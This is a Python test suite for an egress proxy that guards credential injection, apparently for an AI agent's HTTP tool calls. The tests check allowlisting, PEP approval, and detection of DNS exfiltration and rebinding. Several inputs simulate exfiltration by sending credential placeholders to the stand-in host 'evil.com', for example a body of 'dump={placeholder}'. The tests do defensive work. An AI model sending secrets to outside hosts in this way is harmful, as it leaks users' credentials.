"""M3 egress proxy and credential injection tests."""

from __future__ import annotations

import ipaddress

from shisad.core.types import CredentialRef
from shisad.executors.proxy import EgressProxy, NetworkPolicy
from shisad.security.credentials import CredentialConfig, InMemoryCredentialStore


def _public_resolver(_hostname: str) -> list[str]:
    return ["93.184.216.34"]


def test_m3_proxy_injects_placeholder_for_allowed_host() -> None:
    store = InMemoryCredentialStore()
    store.register(
        CredentialRef("gmail_primary"),
        "super-secret-token",
        CredentialConfig(allowed_hosts=["api.good.com"]),
    )
    placeholder = store.get_placeholder(CredentialRef("gmail_primary"))
    proxy = EgressProxy(credential_store=store, resolver=_public_resolver)
    decision = proxy.authorize_request(
        tool_name="http_request",
        url="https://api.good.com/v1/send",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["api.good.com"]),
        headers={"Authorization": placeholder},
        approved_by_pep=True,
    )
    assert decision.allowed is True
    assert decision.injected_headers["Authorization"] == "super-secret-token"


def test_m3_proxy_blocks_host_not_in_allowlist() -> None:
    proxy = EgressProxy(resolver=_public_resolver)
    decision = proxy.authorize_request(
        tool_name="http_request",
        url="https://evil.com/push",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["api.good.com"]),
    )
    assert decision.allowed is False
    assert decision.reason == "host_not_allowlisted"


def test_m3_proxy_blocks_credential_injection_for_non_allowed_host() -> None:
    store = InMemoryCredentialStore()
    store.register(
        CredentialRef("gmail_primary"),
        "super-secret-token",
        CredentialConfig(allowed_hosts=["api.good.com"]),
    )
    placeholder = store.get_placeholder(CredentialRef("gmail_primary"))
    proxy = EgressProxy(credential_store=store, resolver=_public_resolver)
    decision = proxy.authorize_request(
        tool_name="http_request",
        url="https://evil.com/push",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["evil.com"]),
        headers={"Authorization": placeholder},
        approved_by_pep=True,
    )
    assert decision.allowed is False
    assert decision.reason == "credential_host_mismatch"
    assert decision.alert is True


def test_m3_proxy_requires_pep_approval_for_placeholder_injection() -> None:
    store = InMemoryCredentialStore()
    store.register(
        CredentialRef("gmail_primary"),
        "super-secret-token",
        CredentialConfig(allowed_hosts=["api.good.com"]),
    )
    placeholder = store.get_placeholder(CredentialRef("gmail_primary"))
    proxy = EgressProxy(credential_store=store, resolver=_public_resolver)
    decision = proxy.authorize_request(
        tool_name="http_request",
        url="https://api.good.com/v1/send",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["api.good.com"]),
        headers={"Authorization": placeholder},
    )
    assert decision.allowed is False
    assert decision.reason == "pep_not_approved"


def test_m3_proxy_blocks_placeholder_exfiltration_in_body() -> None:
    store = InMemoryCredentialStore()
    store.register(
        CredentialRef("gmail_primary"),
        "super-secret-token",
        CredentialConfig(allowed_hosts=["api.good.com"]),
    )
    placeholder = store.get_placeholder(CredentialRef("gmail_primary"))
    proxy = EgressProxy(credential_store=store, resolver=_public_resolver)
    decision = proxy.authorize_request(
        tool_name="http_request",
        url="https://evil.com/collect",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["evil.com"]),
        body=f"dump={placeholder}",
        approved_by_pep=True,
    )
    assert decision.allowed is False
    assert decision.reason == "placeholder_exfiltration_blocked"
    assert decision.alert is True


def test_m3_proxy_blocks_dns_exfiltration_like_hostnames() -> None:
    proxy = EgressProxy(resolver=_public_resolver)
    long_label = "a7f" * 24  # 72 chars
    decision = proxy.authorize_request(
        tool_name="http_request",
        url=f"https://{long_label}.api.good.com/submit",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["*.api.good.com"]),
    )
    assert decision.allowed is False
    assert decision.reason == "dns_exfil_suspected"


def test_m3_proxy_dns_exfil_boundary_conditions() -> None:
    proxy = EgressProxy(resolver=_public_resolver)
    label_64 = "a" * 64
    decision_64 = proxy.authorize_request(
        tool_name="http_request",
        url=f"https://{label_64}.safe.example/path",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["*.safe.example"]),
    )
    assert decision_64.allowed is False
    assert decision_64.reason == "dns_exfil_suspected"

    # Exactly 48 chars but low entropy should not be flagged as exfil.
    label_48_low_entropy = "a" * 48
    decision_48 = proxy.authorize_request(
        tool_name="http_request",
        url=f"https://{label_48_low_entropy}.safe.example/path",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["*.safe.example"]),
    )
    assert decision_48.allowed is True

    label_48_high_entropy = "ab12cd34ef56gh78ij90kl12mn34op56qr78st90uv12wx34"
    decision_high_entropy = proxy.authorize_request(
        tool_name="http_request",
        url=f"https://{label_48_high_entropy}.safe.example/path",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["*.safe.example"]),
    )
    assert decision_high_entropy.allowed is False
    assert decision_high_entropy.reason == "dns_exfil_suspected"


def test_m3_proxy_blocks_dns_rebinding_on_revalidation() -> None:
    calls = 0

    def _flapping_resolver(_hostname: str) -> list[str]:
        nonlocal calls
        calls += 1
        if calls == 1:
            return ["93.184.216.34"]
        return ["10.1.2.3"]

    proxy = EgressProxy(resolver=_flapping_resolver)
    first = proxy.authorize_request(
        tool_name="http_request",
        url="https://api.good.com/v1/send",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["api.good.com"]),
        approved_by_pep=True,
    )
    assert first.allowed is True
    second = proxy.authorize_request(
        tool_name="http_request",
        url="https://api.good.com/v1/send",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["api.good.com"]),
        approved_by_pep=True,
        expected_addresses=first.resolved_addresses,
    )
    assert second.allowed is False
    assert second.reason == "dns_rebinding_blocked"


def test_m3_proxy_ipv6_private_ranges_are_blocked() -> None:
    proxy = EgressProxy(resolver=_public_resolver)
    for candidate in ["::1", "fc00::1", "fe80::1234"]:
        assert ipaddress.ip_address(candidate).version == 6
        assert proxy._is_private(candidate) is True


def test_m3_proxy_fails_closed_on_empty_dns_resolution() -> None:
    proxy = EgressProxy(resolver=lambda _host: [])
    decision = proxy.authorize_request(
        tool_name="http_request",
        url="https://api.good.com/v1/send",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["api.good.com"]),
        approved_by_pep=True,
    )
    assert decision.allowed is False
    assert decision.reason == "dns_resolution_failed"
